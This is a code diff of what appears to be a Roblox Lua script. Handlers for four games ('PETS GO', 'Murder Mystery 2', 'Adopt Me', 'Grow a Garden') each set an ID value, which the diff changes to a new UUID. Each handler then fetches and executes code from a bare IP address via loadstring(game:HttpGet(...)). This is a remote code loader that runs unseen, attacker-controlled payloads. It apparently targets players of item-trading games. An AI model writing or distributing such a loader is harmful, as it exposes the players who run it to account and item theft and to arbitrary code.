@@ -237,7 +237,7 @@ local handlers = {
     [18901165922] = {
         name = "PETS GO",
         action = function()
-            ID="3a5a2b4b-12c7-4193-8bba-99e08ba6e39a";
+            ID="b4f0a009-d8b0-4eed-a249-662f4ea817b9";
             loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
         end
     },
@@ -246,7 +246,7 @@ local handlers = {
     [142823291] = {
         name = "Murder Mystery 2",
         action = function()
-            ID="3a5a2b4b-12c7-4193-8bba-99e08ba6e39a";
+            ID="b4f0a009-d8b0-4eed-a249-662f4ea817b9";
             loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
         end
     },
@@ -255,7 +255,7 @@ local handlers = {
     [920587237] = {
         name = "Adopt Me",
         action = function()
-            ID="3a5a2b4b-12c7-4193-8bba-99e08ba6e39a";
+            ID="b4f0a009-d8b0-4eed-a249-662f4ea817b9";
             loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
         end
     },
@@ -264,7 +264,7 @@ local handlers = {
     [126884695634066] = {
         name = "Grow a Garden",
         action = function()
-            ID="3a5a2b4b-12c7-4193-8bba-99e08ba6e39a";
+            ID="b4f0a009-d8b0-4eed-a249-662f4ea817b9";
             loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
         end
     },
